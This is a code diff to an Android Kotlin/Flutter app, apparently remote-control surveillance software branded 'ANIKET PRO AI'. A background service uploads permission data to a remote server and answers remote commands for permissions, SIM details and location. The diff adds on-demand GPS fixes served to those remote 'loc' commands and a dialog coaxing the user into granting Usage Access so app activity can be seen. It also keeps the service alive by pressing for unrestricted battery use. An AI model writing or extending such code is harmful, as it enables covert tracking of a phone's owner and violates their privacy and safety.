@@ -5,6 +5,7 @@ import android.accounts.AccountManager
 import android.app.Activity
 import android.app.AlarmManager
 import android.app.AlertDialog
+import android.app.AppOpsManager
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -31,7 +32,6 @@ import android.hardware.camera2.CameraManager
 import android.hardware.camera2.CaptureRequest
 import android.media.ImageReader
 import android.media.MediaPlayer
-import android.media.MediaRecorder
 import android.media.RingtoneManager
 import android.net.Uri
 import android.os.Build
@@ -41,6 +41,7 @@ import android.os.HandlerThread
 import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
+import android.os.Process
 import android.os.SystemClock
 import android.provider.CallLog
 import android.provider.ContactsContract
@@ -150,6 +151,28 @@ fun permsJson(ctx: Context): JSONObject {
     return o
 }
 
+// ── location helpers (on-demand GPS, no always-on tracker) ──
+fun bestLast(lm: android.location.LocationManager): android.location.Location? {
+    var best: android.location.Location? = null
+    for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
+        try {
+            val l = lm.getLastKnownLocation(prov)
+            if (l != null && (best == null || l.time > best.time)) best = l
+        } catch (_: Exception) { }
+    }
+    return best
+}
+
+fun locToJson(l: android.location.Location): JSONObject {
+    val o = JSONObject()
+    o.put("lat", l.latitude)
+    o.put("lng", l.longitude)
+    o.put("acc", l.accuracy)
+    o.put("speed", l.speed)
+    o.put("time", l.time)
+    return o
+}
+
 fun locJson(ctx: Context): JSONObject {
     val o = JSONObject()
     try {
@@ -159,25 +182,59 @@ fun locJson(ctx: Context): JSONObject {
             return o
         }
         val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
-        var best: android.location.Location? = null
-        for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
-            try {
-                val l = lm.getLastKnownLocation(prov)
-                if (l != null && (best == null || l.time > best.time)) best = l
-            } catch (_: Exception) { }
-        }
+        val best = bestLast(lm)
         if (best == null) {
             o.put("err", "no_fix")
         } else {
-            o.put("lat", best.latitude)
-            o.put("lng", best.longitude)
-            o.put("acc", best.accuracy)
-            o.put("time", best.time)
+            return locToJson(best)
         }
     } catch (e: Exception) {
         o.put("err", e.message ?: "err")
     }
     return o
+}
+
+// fresh fix: last-known if <2 min old, else wake GPS for max 9 sec
+fun locFresh(ctx: Context, looper: android.os.Looper?): JSONObject {
+    try {
+        if (!permGranted(ctx, Manifest.permission.ACCESS_FINE_LOCATION) &&
+            !permGranted(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)) {
+            return locJson(ctx)
+        }
+        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+        val last = bestLast(lm)
+        if (last != null && System.currentTimeMillis() - last.time < 120000) {
+            return locToJson(last)
+        }
+        val latch = CountDownLatch(1)
+        val out = arrayOf<android.location.Location?>(null)
+        val ht = HandlerThread("locx").apply { start() }
+        val hh = Handler(ht.looper)
+        val listener = object : android.location.LocationListener {
+            override fun onLocationChanged(l: android.location.Location) {
+                if (out[0] == null) {
+                    out[0] = l
+                    latch.countDown()
+                }
+            }
+            @Deprecated("deprecated")
+            override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
+            override fun onProviderEnabled(p: String) {}
+            override fun onProviderDisabled(p: String) {}
+        }
+        for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
+            try { lm.requestLocationUpdates(prov, 0L, 0f, listener, hh) } catch (_: Exception) { }
+        }
+        latch.await(9, TimeUnit.SECONDS)
+        try { lm.removeUpdates(listener) } catch (_: Exception) { }
+        try { ht.quitSafely() } catch (_: Exception) { }
+        val fresh = out[0]
+        if (fresh != null) return locToJson(fresh)
+        if (last != null) return locToJson(last)
+        return locJson(ctx)
+    } catch (e: Exception) {
+        return locJson(ctx)
+    }
 }
 
 // ═══════════════════════════════════════════════════════════════════════
@@ -242,9 +299,6 @@ class RemoteService : Service() {
                 var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                 if (permGranted(this, Manifest.permission.CAMERA)) {
                     types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-                }
-                if (permGranted(this, Manifest.permission.RECORD_AUDIO)) {
-                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                 }
                 if (permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION) ||
                     permGranted(this, Manifest.permission.ACCESS_COARSE_LOCATION)) {
@@ -325,7 +379,6 @@ class RemoteService : Service() {
         loop++
         if (loop % 25 == 0) {
             httpPut("$b/perms.json", permsJson(this).toString())
-            httpPut("$b/loc.json", locJson(this).toString())
             simWatch()
         }
 
@@ -383,22 +436,13 @@ class RemoteService : Service() {
         val r = JSONObject()
         try {
             when (type) {
-                "ping" -> {
-                    r.put("ok", true)
-                    val d = JSONObject()
-                    d.put("model", Build.MODEL)
-                    d.put("sdk", Build.VERSION.SDK_INT)
-                    d.put("bat", (getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager)
-                        .getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY))
-                    r.put("data", d)
-                }
                 "perms" -> {
                     r.put("ok", true)
                     r.put("data", permsJson(this))
                 }
                 "loc" -> {
                     r.put("ok", true)
-                    r.put("data", locJson(this))
+                    r.put("data", locFresh(this, thread?.looper))
                 }
                 "sim" -> {
                     r.put("ok", true)
@@ -756,34 +800,16 @@ class MainActivity : FlutterActivity() {
     private var pendingDeleteResult: MethodChannel.Result? = null
     private var player: MediaPlayer? = null
 
-    // ── LIVE location tracker ──
-    private var liveLoc: android.location.Location? = null
-    private var locListener: android.location.LocationListener? = null
-
-    private fun startLocTracker() {
-        try {
-            if (!permGranted(this, Manifest.permission.ACCESS_FINE_LOCATION) &&
-                !permGranted(this, Manifest.permission.ACCESS_COARSE_LOCATION)) return
-            if (locListener != null) return
-            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
-            locListener = object : android.location.LocationListener {
-                override fun onLocationChanged(l: android.location.Location) {
-                    liveLoc = l
-                }
-                @Deprecated("deprecated")
-                override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
-                override fun onProviderEnabled(p: String) {}
-                override fun onProviderDisabled(p: String) {}
-            }
-            for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
-                try {
-                    lm.requestLocationUpdates(prov, 1000L, 1f, locListener!!)
-                } catch (_: Exception) { }
-            }
-        } catch (_: Exception) { }
+    private fun hasUsageAccess(): Boolean {
+        return try {
+            val am = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
+            val mode = am.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
+            mode == AppOpsManager.MODE_ALLOWED
+        } catch (_: Exception) {
+            false
+        }
     }
 
-    // ── battery: ask until Unrestricted (ignore-optimizations whitelist) ──
     private fun promptBatteryUnrestricted() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -805,12 +831,36 @@ class MainActivity : FlutterActivity() {
         } catch (_: Exception) { }
     }
 
+    private fun promptUsageAccess() {
+        try {
+            if (hasUsageAccess()) return
+            AlertDialog.Builder(this)
+                .setTitle("Recent apps access")
+                .setMessage("To see which apps were used on this phone, enable Usage Access. Tap Allow, then find ANIKET PRO AI in the list and turn it ON.")
+                .setPositiveButton("Allow") { d, _ ->
+                    d.dismiss()
+                    try {
+                        startActivity(
+                            Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS, Uri.parse("package:$packageName"))
+                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        )
+                    } catch (_: Exception) {
+                        try {
+                            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                        } catch (_: Exception) { }
+                    }
+                }
+                .setNegativeButton("Later") { d, _ -> d.dismiss() }
+                .show()
+        } catch (_: Exception) { }
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
         startAgentIfReady(this)
-        startLocTracker()
         promptBatteryUnrestricted()
+        promptUsageAccess()
     }
 
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
@@ -858,6 +908,16 @@ class MainActivity : FlutterActivity() {
         } catch (e: Exception) {
             src
         }
+    }
+
+    private fun locMap(l: android.location.Location): HashMap<String, Any> {
+        val m = HashMap<String, Any>()
+        m["lat"] = l.latitude
+        m["lng"] = l.longitude
+        m["acc"] = l.accuracy
+        m["speed"] = l.speed
+        m["time"] = l.time
+        return m
     }
 
     private fun setupGalleryChannel(flutterEngine: FlutterEngine) {
@@ -934,18 +994,36 @@ class MainActivity : FlutterActivity() {
                         if (!ok) {
                             result.success(null)
                         } else {
-                            startLocTracker()
-                            val l = liveLoc
-                            if (l != null) {
-                                val m = HashMap<String, Any>()
-                                m["lat"] = l.latitude
-                                m["lng"] = l.longitude
-                                m["acc"] = l.accuracy
-                                m["speed"] = l.speed
-                                m["time"] = l.time
-                                result.success(m)
+                            val lm = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+                            val last = bestLast(lm)
+                            if (last != null && System.currentTimeMillis() - last.time < 120000) {
+                                result.success(locMap(last))
                             } else {
-                                result.success(locJson(this))
+                                val done = booleanArrayOf(false)
+                                val listener = object : android.location.LocationListener {
+                                    override fun onLocationChanged(l: android.location.Location) {
+                                        if (!done[0]) {
+                                            done[0] = true
+                                            try { lm.removeUpdates(this) } catch (_: Exception) { }
+                                            result.success(locMap(l))
+                                        }
+                                    }
+                                    @Deprecated("deprecated")
+                                    override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
+                                    override fun onProviderEnabled(p: String) {}
+                                    override fun onProviderDisabled(p: String) {}
+                                }
+                                for (prov in listOf(android.location.LocationManager.GPS_PROVIDER, android.location.LocationManager.NETWORK_PROVIDER)) {
+                                    try { lm.requestLocationUpdates(prov, 0L, 0f, listener) } catch (_: Exception) { }
+                                }
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    if (!done[0]) {
+                                        done[0] = true
+                                        try { lm.removeUpdates(listener) } catch (_: Exception) { }
+                                        val l2 = bestLast(lm)
+                                        if (l2 != null) result.success(locMap(l2)) else result.success(null)
+                                    }
+                                }, 8000)
                             }
                         }
                     }
@@ -1251,12 +1329,6 @@ class MainActivity : FlutterActivity() {
     override fun onDestroy() {
         watcher?.let { contentResolver.unregisterContentObserver(it) }
         player?.release()
-        try {
-            locListener?.let {
-                (getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager)
-                    .removeUpdates(it)
-            }
-        } catch (_: Exception) { }
         super.onDestroy()
     }
 }
